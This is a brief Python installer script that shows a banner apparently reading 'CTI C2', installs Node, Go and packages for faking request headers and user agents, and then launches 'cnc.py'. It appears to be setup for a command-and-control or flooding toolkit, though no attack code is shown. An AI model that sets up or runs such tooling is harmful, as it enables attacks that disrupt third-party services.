import os
print("""
\033[37m  ░█████╗░████████╗██╗  ░█████╗░██████╗░
\033[37m  ██╔══██╗╚══██╔══╝██║  ██╔══██╗╚════██╗
\033[37m  ██║░░╚═╝░░░██║░░░██║  ██║░░╚═╝░░███╔═╝
\033[37m  ██║░░██╗░░░██║░░░██║  ██║░░██╗██╔══╝░░
\033[37m  █████╔  ░░░██║░░░██║  ╚█████╔╝███████╗
\033[37m ░╚════╝ ░░░░╚═╝░░░╚═╝  ░╚════╝░╚══════╝

""")

print("""\33[0;32m[1] RUN\n[2] CANCEL\nWhich one do you use?""")

c = input(">>>: ")
if c == "1":
    os.system("pkg install nodejs")
    os.system("pip install colorama")
    os.system("pip install requests")
    os.system("npm i header-generator")
    os.system("npm i crypto")
    os.system("npm i cluster")
    os.system("npm i user-agents")
    os.system("npm i axios")
    os.system("pkg install golang")
    os.system("python3 cnc.py")

elif c == "2":
    os.system("clear")

print("\33[0;32m[ √ ] S U C C E S S F U L L Y")
